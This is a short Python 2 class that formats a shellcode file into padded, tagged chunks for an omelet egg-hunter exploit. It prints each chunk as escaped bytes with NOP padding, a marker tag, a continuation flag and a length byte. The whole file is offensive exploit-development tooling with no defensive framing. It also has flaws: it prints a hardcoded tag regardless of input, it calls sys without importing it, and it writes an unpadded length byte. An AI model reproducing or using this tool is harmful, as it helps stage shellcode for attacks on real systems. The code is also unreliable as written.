class Omlete(object):
	
	def __init__(self, chunk_size=None, padding=None, tag=None, shellcode=None):
		self.shellcode = shellcode
		self.chunk_size = chunk_size
		self.padding = ["\\x90"] * padding
		self.tag = tag
		print "[+] generate with tag \\x12\\x34\\x56\\x78 0x78563412\n"

	def split(self, arr, size):
	    arrs = []
	    while len(arr) > size:
	        pice = arr[:size]
	        arrs.append(pice)
	        arr = arr[size:]
	    arrs.append(arr)
	    return arrs

	def generate(self):
		try:
			data = open(self.shellcode).read()
		except:
			print "Error Reading File"
			sys.exit(0)

		arrs = self.split(data, self.chunk_size)
		for i, arr in enumerate(arrs):
			shell = []
			shell += self.padding
			shell += self.tag
			if i != len(arrs) - 1:
				shell.append("\\x02")
			else:
				shell.append("\\x01")
			shell.append("\\x" + str(hex(len(arr))).replace("0x",""))
			shell += ["\\x" + arr.encode("hex")[i*2:i*2+2] for i in range(len(arr.encode('hex'))/2)]
			print "".join(shell)
			print "\n"